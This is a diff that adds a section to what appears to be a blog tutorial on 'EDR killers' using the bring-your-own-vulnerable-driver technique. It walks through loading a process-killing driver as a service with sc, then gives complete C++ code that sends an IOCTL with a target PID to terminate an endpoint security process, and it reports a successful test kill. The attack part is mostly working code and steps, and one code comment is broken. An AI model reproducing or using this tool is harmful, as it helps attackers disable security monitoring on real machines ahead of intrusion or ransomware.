@@ -23,8 +23,139 @@ to answer this question we need to understand how the windows detect suspicious 
 # How EDR Killers are Implemented 
 
 * before we start the technical part of this blog , there is some prerequisite needed from you to know to continue this post , ad some of them is to know how edr processes collect telemetry and which win api's used for that and also how to code a basic driver and how it communicates with a userland program (sending and receiving data from and to the driver)
+* before starting implementing the code, to make this code works in real world we need a vulnerable driver , this is way this technique called BYOVD (bring your own vulnerable driver) , but in our blog we create our own driver with its space memory that do the work for us.
 
-* 
+## How to exploit a vulnerable driver killer ?
+we need to create a driver as a service and start it with sc manager tool after that we implement the code that comminucate with our driver to kill the edr process, to do that we follow this steps
+
+## Loading the driver as killer service 
+as i mentioned before , we need something that runs in the kernel level which will be our driver that we need to load it as a service , and to do that we follow this steps:
+1. getting the vulnerable driver from any relabel source , in my case i am using the killer driver i get it from the internel
+2. create a service named `driver_killer` with the path to the killer driver using sc tool s shown in the image  
+
+-- image --
+
+2. starting the service which loads the driver to its kernel memory, using the command show in the image 
+
+-- image --
+
+## implementing the killer code 
+* after we laoded the driver successfully , now its waiting for our call , now its time to create the code that tell the driver what to do (kill a process by passing the appropriate IOCTL code) and which process to kill by passing the PID of th target process. see the code below: 
+
+```cpp
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char* argv[]) {
+    
+    // checking the number of args
+    if (argc != 7) {
+        printf("Usage: %s -d <device_name> -i <ioctl_code> -p <pid>\n", argv[0]);
+        return 1;
+    }
+
+    const char* deviceName = NULL; 
+    DWORD ioctlCode = 0;        
+    DWORD pid = 0;                 
+
+    // parsing the command line arguments 
+    for (int i = 1; i < argc; i += 2) {
+        if (strcmp(argv[i], "-d") == 0) {
+            deviceName = argv[i + 1]; 
+        }
+        else if (strcmp(argv[i], "-i") == 0) {
+            ioctlCode = (DWORD)strtoul(argv[i + 1], NULL, 0);
+        }
+        else if (strcmp(argv[i], "-p") == 0) {
+            pid = (DWORD)atoi(argv[i + 1]);
+        }
+        else {
+            printf("Invalid argument: %s\n", argv[i]);
+            return 1;
+        }
+    }
+
+    // check if the parse process succeed 
+    if (!deviceName || ioctlCode == 0 || pid == 0) {
+        printf("Invalid or missing arguments.\n");
+        return 1;
+    }
+
+    // Open a handle to the device driver.
+    HANDLE deviceHandle = CreateFileA(deviceName,
+        GENERIC_WRITE | GENERIC_READ,
+        0,
+        NULL,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL);
+
+    // Check if the handle to the device was successfully created.
+    if (deviceHandle == INVALID_HANDLE_VALUE) {
+        printf("Failed to open device: %s\n", deviceName);
+        return 1;
+    }
+
+    
+     // Send an IOCTL request to the device driver with the operation control code.
+     * - deviceHandle: Handle to the opened device.
+     * - ioctlCode: The control code specifying the operation.
+     * - &pid: Pointer to the PID to terminate.
+     * - sizeof(pid): Size of the input buffer.
+     * - NULL: No output buffer.
+     * - 0: Output buffer size is zero.
+     * - NULL: No variable to store bytes returned.
+     * - NULL: No OVERLAPPED structure.
+     */
+    if (!DeviceIoControl(deviceHandle, ioctlCode, &pid, sizeof(pid), NULL, 0, NULL, NULL)) {
+        printf("Failed to send IOCTL request. Error code: %d\n", GetLastError());
+    }
+    else {
+        // If successful, print the IOCTL request and the target PID.
+        printf("Sent IOCTL request (0x%X) to terminate PID: %lu\n", ioctlCode, pid);
+    }
+
+    // Close the handle to the device to free system resources.
+    CloseHandle(deviceHandle);
+    return 0;
+}
+
+
+```
+
+### Code Walkthrough
+1. we open a handle to the device using the `CreateFile` winapi with the read/write permissions and passing to it the target device name with this args:
+    - deviceName: Name of the device driver we loaded .
+    - GENERIC_WRITE | GENERIC_READ: Grants read and write permissions.
+    - OPEN_EXISTING: Opens an existing device.
+    - FILE_ATTRIBUTE_NORMAL: Uses normal file attributes.
+
+2. we need to communicate with the driver using the `DeviceIoControl` winapi to invoke the IOCTL and passing to it the PID of the target EDR process you want to kill with the following args:
+     - deviceHandle: Handle to the opened device.
+     - ioctlCode: The control code specifying the operation (terminating a process).
+     - &pid: Pointer to the PID to terminate.
+     - sizeof(pid): Size of the input buffer.
+     - NULL: No output buffer.
+     - 0: Output buffer size is zero.
+     - NULL: No variable to store bytes returned.
+     - NULL: No OVERLAPPED structure.
+
+
+## testing our killer :
+after implementing the code its time to test it , compile the code in a release mode then load the driver .
+identify the edr process you want to kill , from process hacker we target the process `` , as we can see in below image the pid is 1578 .
+
+--image -- 
+
+
+now we load our driver and start our program.
+from process hacker we see the edr process `` has terminated when we run our program 
+
+--image--
+
+
 
 
 
